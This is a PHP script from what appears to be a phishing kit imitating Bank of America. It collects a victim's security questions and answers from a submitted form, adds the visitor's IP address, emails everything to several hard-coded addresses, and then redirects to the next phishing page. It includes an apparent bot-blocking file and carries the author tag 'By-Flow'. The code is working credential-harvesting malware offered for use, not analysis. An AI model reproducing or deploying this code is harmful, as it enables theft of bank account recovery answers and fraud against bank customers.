<?php
include '../blocker.php';
$ip = getenv("REMOTE_ADDR");
$message .= "BOFA---QUESTION--N--ANSW3R-----------\n";
$message .= "QUESTION 1: " .$_POST['q1']."\n\n";
$message .= "ANSWER 1: " .$_POST['a1']."\n\n";
$message .= "QUESTION 2: " .$_POST['q2']."\n\n";
$message .= "Answer 2: " .$_POST['2']."\n\n";
$message .= "QUESTION 3: " .$_POST['q3']."\n\n";
$message .= "Answer 3: " .$_POST['a3']."\n\n";
$message .= "B0FA---QUEST10N--N--ANSW3R-----------\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$message .= "By-Flow------\n";
$recipient = "donflow2021@yahoo.com,donflowmania@yahoo.com, user0202777a@gmail.com, jcole15000@hotmail.com, donflowmania@maine.rr.com";
$subject = "B0fa-question--n---answer";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."B0fa-Quest";
$headers .= "B0FA---QUEST--ANS";
     mail("$cc", "yahoo Info", $message);
if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: --=^=++.php");

       }
else
           {
        echo "ERROR! Please go back and try again.";
         }

?>
        